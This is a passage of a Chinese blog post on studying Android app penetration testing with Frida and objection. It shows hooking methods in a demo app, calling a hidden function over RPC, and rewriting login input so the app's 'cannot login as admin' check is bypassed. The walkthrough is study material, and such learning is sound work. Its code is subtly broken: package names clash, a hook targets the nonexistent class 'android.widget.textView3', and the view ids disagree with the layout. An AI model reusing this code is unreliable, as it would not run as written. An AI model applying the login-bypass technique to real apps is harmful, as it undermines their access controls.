+目标应用的包名：“<strong>cn.gemini.k.fridatest</strong>”（一般在AndroidManifest.xml文件中可以找到）<br>
+目标方法所在类的类名：“cn.gemini.k.fridatest.FridaHook1”;<br>
+最后是目标方法名和参数：public int func1_add(int a,int b)<br>
+没有源码的情况下这些信息都可以通过反编译工具jadx或jeb获取。</p>
+<h4 id="hook参数-修改结果重载-隐藏函数的处理">hook参数、修改结果（重载、隐藏函数的处理）</h4>
+<p>接下来开始编写hook代码，首先是python文件</p>
+<pre><code class="language-python">import time
+import frida
+
+# 连接安卓机上的frida-server
+device = frida.get_usb_device(10)
+# 启动`demo02`这个app
+pid = device.spawn([&quot;com.example.frida&quot;])
+device.resume(pid)#通过pid重新启动
+time.sleep(1)
+session = device.attach(pid)
+# 加载1.js脚本
+with open(&quot;1.js&quot;) as f:
+    script = session.create_script(f.read())#上一步连接到的session 去执行js
+script.load()
+
+# 脚本会持续运行等待输入
+input()
+</code></pre>
+<p>1.js脚本内容</p>
+<pre><code class="language-js">console.log(&quot;Script loaded successfully &quot;);
+Java.perform(function x() {
+    console.log(&quot;Inside java perform function&quot;);
+    //定位类
+    console.log(&quot;begin&quot;);
+    Java.choose(&quot;com.example.frida.MainActivity&quot; , {
+    onMatch : function(instance){ //该类有多少个实例，该回调就会被触发多少次
+        console.log(&quot;Found instance: &quot;+instance);
+        console.log(&quot;Result of secret func: &quot; + instance.secret());
+    },
+    onComplete:function(){}
+    });
+    console.log(&quot;end&quot;);
+    var my_class = Java.use(&quot;com.example.frida.MainActivity&quot;);
+    var string_class = Java.use(&quot;java.lang.String&quot;); //获取String类型
+    console.log(&quot;Java.Use.Successfully!&quot;);//定位类成功！
+    //在这里更改类的方法的实现（implementation）
+    my_class.fun.overload(&quot;int&quot; , &quot;int&quot;).implementation = function(x,y){
+        //打印替换前的参数
+        console.log( &quot;original call: fun(&quot;+ x + &quot;, &quot; + y + &quot;)&quot;);
+        //把参数替换成2和5，依旧调用原函数
+        var ret_value = this.fun(2, 5);
+        return ret_value;
+    }
+    my_class.fun.overload(&quot;java.lang.String&quot;).implementation = function(x){
+        console.log(&quot;*************************************&quot;);
+        var my_string = string_class.$new(&quot;lyyy&quot;); //new一个新字符串
+        console.log(&quot;Original arg: &quot; +x );
+        var ret =  this.fun(my_string); // 用新的参数替换旧的参数，然后调用原函数获取结果
+        console.log(&quot;Return value: &quot;+ret);
+        console.log(&quot;*************************************&quot;);
+        return ret;
+      };
+    });
+
+</code></pre>
+<p>执行python脚本，这里需要提前启动frida-server</p>
+<pre><code>adb shell
+/data/local/tmp/frida-server-15.1.17-android-x86
+</code></pre>
+<p>这里成功将参数以及返回结果修改为lyyy</p>
+<h4 id="远程调用">远程调用</h4>
+<p>这个实例主要是实现在py脚本中也可以调用secret函数。这里主要是使用的frida提供的RPC功能（Remote Procedure Call）</p>
+<p>apk文件还是上一个样例的文件。</p>
+<p>现在修改下js脚本。</p>
+<pre><code class="language-js">console.log(&quot;Script loaded successfully &quot;);
+function callsecretFun(){
+    Java.perform(function x() {
+        console.log(&quot;Inside java perform function&quot;);
+        //定位类
+        console.log(&quot;begin&quot;);
+        Java.choose(&quot;com.example.frida.MainActivity&quot; , {
+        onMatch : function(instance){ //该类有多少个实例，该回调就会被触发多少次
+            console.log(&quot;Found instance: &quot;+instance);
+            console.log(&quot;Result of secret func: &quot; + instance.secret());
+        },
+        onComplete:function(){}
+        });
+        console.log(&quot;end&quot;);
+        
+       
+    });
+}
+rpc.exports = {
+    callsecretfunction:callsecretFun//把callSecretFun函数导出为callsecretfunction符号，导出名不可以有大写字母或者下划线
+};
+
+</code></pre>
+<p>对应python</p>
+<pre><code class="language-python">import time
+import frida
+
+# 连接安卓机上的frida-server
+device = frida.get_usb_device(10)
+# 启动`demo02`这个app
+pid = device.spawn([&quot;com.example.frida&quot;])
+device.resume(pid)
+time.sleep(1)
+session = device.attach(pid)
+# 加载s1.js脚本
+with open(&quot;2.js&quot;) as f:
+    script = session.create_script(f.read())
+script.load()
+
+command = &quot;&quot;
+while 1 == 1:
+    command = input(&quot;Enter command:\n1: Exit\n2: Call secret function\nchoice:&quot;)
+    if command == &quot;1&quot;:
+        break
+    elif command == &quot;2&quot;: #在这里调用
+        script.exports.callsecretfunction()
+</code></pre>
+<p>成功的调用了secret函数</p>
+<figure data-type="image" tabindex="45"><img src="https://img-blog.csdnimg.cn/img_convert/6c2a5fe2aee6e1e968f0529ac1cb9404.png" alt="image-20220221142111489" loading="lazy"></figure>
+<p>打印了@@@###@@@</p>
+<h4 id="动态修改">动态修改</h4>
+<p>这里主要实现的功能不仅仅是可以用python调用app的函数。还要做到把数据从app传到python程序中，通过python代码修改传回到app里。<br>
+app代码：</p>
+<pre><code class="language-java">import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.util.Base64;
+import android.view.View;
+import android.widget.EditText;
+import android.widget.TextView;
+
+public class MainActivity extends AppCompatActivity {
+    EditText username_et;
+    EditText password_et;
+    TextView message_tv;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        password_et = (EditText) this.findViewById(R.id.editText2);
+        username_et = (EditText) this.findViewById(R.id.editText);
+        message_tv = ((TextView) findViewById(R.id.textView));
+
+        this.findViewById(R.id.button).setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+
+                if (username_et.getText().toString().compareTo(&quot;admin&quot;) == 0) {
+                    message_tv.setText(&quot;You cannot login as admin&quot;);
+                    return;
+                }
+                //hook target
+                message_tv.setText(&quot;Sending to the server :&quot; + Base64.encodeToString((username_et.getText().toString() + &quot;:&quot; + password_et.getText().toString()).getBytes(), Base64.DEFAULT));
+
+            }
+        });
+
+    }
+}
+</code></pre>
+<p>activity_main.xml文件</p>
+<p>1.id要对应</p>
+<p>2.页面挤压时用</p>
+<figure data-type="image" tabindex="46"><img src="https://img-blog.csdnimg.cn/img_convert/bf562ccea583721bda455c3e0ca61bbe.png" alt="image-20220221145650913" loading="lazy"></figure>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
+    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    tools:context=&quot;.MainActivity&quot;&gt;
+
+    &lt;Button
+        android:id=&quot;@+id/button&quot;
+        android:layout_width=&quot;wrap_content&quot;
+        android:layout_height=&quot;wrap_content&quot;
+        android:layout_marginStart=&quot;4dp&quot;
+        android:layout_marginTop=&quot;55dp&quot;
+        android:text=&quot;login&quot;
+        app:layout_constraintStart_toStartOf=&quot;parent&quot;
+        app:layout_constraintTop_toBottomOf=&quot;@+id/editTextTextPersonName2&quot; /&gt;
+
+    &lt;EditText
+        android:id=&quot;@+id/editTextTextPersonName&quot;
+        android:layout_width=&quot;wrap_content&quot;
+        android:layout_height=&quot;wrap_content&quot;
+        android:layout_marginStart=&quot;10dp&quot;
+        android:layout_marginTop=&quot;150dp&quot;
+        android:layout_marginBottom=&quot;150dp&quot;
+        android:ems=&quot;10&quot;
+        android:inputType=&quot;textPersonName&quot;
+        android:text=&quot;Name&quot;
+        app:layout_constraintBottom_toBottomOf=&quot;@+id/editTextTextPersonName2&quot;
+        app:layout_constraintStart_toStartOf=&quot;parent&quot;
+        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;
+
+    &lt;EditText
+        android:id=&quot;@+id/editTextTextPersonName2&quot;
+        android:layout_width=&quot;wrap_content&quot;
+        android:layout_height=&quot;wrap_content&quot;
+        android:layout_marginStart=&quot;10dp&quot;
+        android:layout_marginTop=&quot;300dp&quot;
+        android:ems=&quot;10&quot;
+        android:inputType=&quot;textPersonName&quot;
+        android:text=&quot;passowrd&quot;
+        app:layout_constraintStart_toStartOf=&quot;parent&quot;
+        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;
+
+    &lt;TextView
+        android:id=&quot;@+id/textView3&quot;
+        android:layout_width=&quot;wrap_content&quot;
+        android:layout_height=&quot;wrap_content&quot;
+        android:layout_marginStart=&quot;4dp&quot;
+        android:layout_marginTop=&quot;16dp&quot;
+        android:text=&quot;adminmanager&quot;
+        app:layout_constraintStart_toStartOf=&quot;parent&quot;
+        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;
+&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;
+</code></pre>
+<p>接下来操作是python代码获取输入内容，并修改输入内容然后传输到app，通过验证。（包括admin）<br>
+js代码主要实现是先截到输入内容，传输到python代码，然后等python传入新数据继续执行。<br>
+js代码</p>
+<pre><code class="language-JavaScript">console.log(&quot;Script loaded successfully &quot;);
+
+Java.perform(function () {
+    var tv_class = Java.use(&quot;android.widget.textView3&quot;);
+    tv_class.setText.overload(&quot;java.lang.CharSequence&quot;).implementation = function (x) {
+        var string_to_send = x.toString();
+        var string_to_recv;
+        console.log(&quot;Script loaded successfully &quot;);
+        send(string_to_send); // 将数据发送给python的python代码
+        recv(function (received_json_object) {
+            string_to_recv = received_json_object.my_data
+            console.log(&quot;string_to_recv: &quot; + string_to_recv);
+        }).wait(); //收到数据之后，再执行下去
+        var my_string = Java.use(&quot;java.lang.String&quot;).$new(string_to_recv);
+        this.setText(my_string);
+    }
+});
+</code></pre>
+<p>python代码</p>
+<pre><code class="language-python">import time
+import frida
+import base64
+def my_message_handler(message, payload):
+    print(message)
+    print(payload)
+    if message[&quot;type&quot;] == &quot;send&quot;:
+        print (message[&quot;payload&quot;])
+        data = message[&quot;payload&quot;].split(&quot;:&quot;)[1].strip()
+        print(data)
+        print ('message:', message)
+        data = str(base64.b64decode(data))
+        user,pw = data.split(&quot;:&quot;)
+        print(&quot;user:&quot;,user)
+        data =str(base64.b64encode((&quot;admin&quot; + &quot;:&quot; + pw).encode()))
+        print (&quot;encoded data:&quot;, data)
+        script.post({&quot;my_data&quot;: data})  # 将JSON对象发送回去
+        print (&quot;Modified data sent&quot;)
+
+
+# 连接安卓机上的frida-server
+device = frida.get_usb_device(10)
+# 启动`demo02`这个app
+pid = device.spawn([&quot;com.example.frida&quot;])
+device.resume(pid)
+time.sleep(1)
+session = device.attach(pid)
+# 加载a.js脚本
+with open(&quot;3.js&quot;) as f:
+    script = session.create_script(f.read())
+script.on(&quot;message&quot;, my_message_handler)
+script.load()
+input()
+</code></pre>
+<p>直接运行python代码，然后输入新的用户名和密码，我们原程序是本来不可以输入admin的，我们本代码就是通过输入其他内容，通过frida更改他的用户名参数，使得输入内容用户名为admin。<br>
+执行结果如下：</p>
+<figure data-type="image" tabindex="47"><img src="https://img-blog.csdnimg.cn/img_convert/b16ba70fe6b5f2448348d4344173c61d.png" alt="image-20220221153423999" loading="lazy"></figure>
+<p>就是绕过了if语句提交了用户名为admin的post请求</p>
+<pre><code>if (username_et.getText().toString().compareTo(&quot;admin&quot;) == 0) {
+                    message_tv.setText(&quot;You cannot login as admin&quot;);
+                    return;
+                }
+</code></pre>
+<p>实现了动态内容的修改</p>
+<h3 id="objection-frida_api调用"><strong>objection-frida_api调用</strong></h3>
+<pre><code>python3 -m pip install  objection
+</code></pre>
+<h4 id="11-获取基本信息">1.1 获取基本信息</h4>
+<p>首先介绍几个基本操作：</p>
+<ul>
+<li>键入命令之后，回车执行；</li>
+<li>help：不知道当前命令的效果是什么，在当前命令前加<code>help</code>比如，<code>help env</code>，回车之后会出现当前命令的解释信息；</li>
+<li>按空格：不知道输入什么就按空格，会有提示出来，上下选择之后再按空格选中，又会有新的提示出来；</li>
+<li>jobs：作业系统很好用，建议一定要掌握，可以同时运行多项(<code>hook</code>)作业；</li>
+</ul>
+<p>我们以安卓内置应用“设置”为例，来示范一下基本的用法。</p>
+<p>在手机上启动<code>frida-server</code>，并且点击启动“设置”图标，手机进入设置的界面，首先查看一下“设置”应用的包名。</p>
+<pre><code>frida-ps -U
+</code></pre>
+<p>再使用<code>objection</code>注入“设置”应用。</p>
+<pre><code>objection -g com.android.settings explore
+</code></pre>
+<p>启动<code>objection</code>之后，会出现提示它的<code>logo</code>，这时候不知道输入啥命令的话，可以按下空格，有提示的命令及其功能出来；再按空格选中，又会有新的提示命令出来，这时候按回车就可以执行该命令</p>
+<figure data-type="image" tabindex="48"><img src="https://img-blog.csdnimg.cn/img_convert/bf51e0b6d7f5990b972e05926e9a92fd.png" alt="image-20220221162046827" loading="lazy"></figure>
+<h4 id="12-提取内存信息">1.2 提取内存信息</h4>
+<ul>
+<li>查看内存中加载的库</li>
+</ul>
+<p>运行命令<code>memory list modules</code></p>
+<figure data-type="image" tabindex="49"><img src="https://img-blog.csdnimg.cn/img_convert/1880bc6e5d6f65453bef3b87c83dfd56.png" alt="image-20220221162127128" loading="lazy"></figure>
+<ul>
+<li>查看库的导出函数</li>
+</ul>
+<p>运行命令<code>memory list exports libssl.so</code></p>
+<figure data-type="image" tabindex="50"><img src="https://img-blog.csdnimg.cn/img_convert/fd559b178220a9b6e0b6c1b240944591.png" alt="image-20220221162227506" loading="lazy"></figure>
+<ul>
+<li>将结果保存到<code>json</code>文件中</li>
+</ul>
+<p>当结果太多，终端无法全部显示的时候，可以将结果导出到文件中，然后使用其他软件查看内容</p>
+<pre><code># memory list exports libart.so --json /root/libart.json  
+Writing exports as json to /root/libart.json...
+Wrote exports to: /root/libart.json
+</code></pre>
+<ul>
+<li>提取整个(或部分)内存</li>
+</ul>
+<p>命令是<code>memory dump all from_base</code>，这部分内容与下文脱壳部分有重叠，我们在脱壳部分介绍用法。</p>
+<ul>
+<li>搜索整个内存</li>
+</ul>
+<p>命令是<code>memory search --string --offsets-only</code>，这部分也与下文脱壳部分有重叠，我们在脱壳部分详细介绍用法。</p>
+<h1 id="android-app开发">Android APP开发</h1>
+<p>下载</p>
+<pre><code>https://developer.android.com/studio
+</code></pre>
+<p>将代码放入MainActivity</p>
+<p>且用adb连接上模拟器之后run即可</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/yso-zhi-cc1-lian/" class="post-title gt-a-link">
+                    yso之CC1链
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/app-shen-tou-ce-shi-xue-xi/" class="leancloud_visitors" data-flag-title="APP渗透测试学习">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
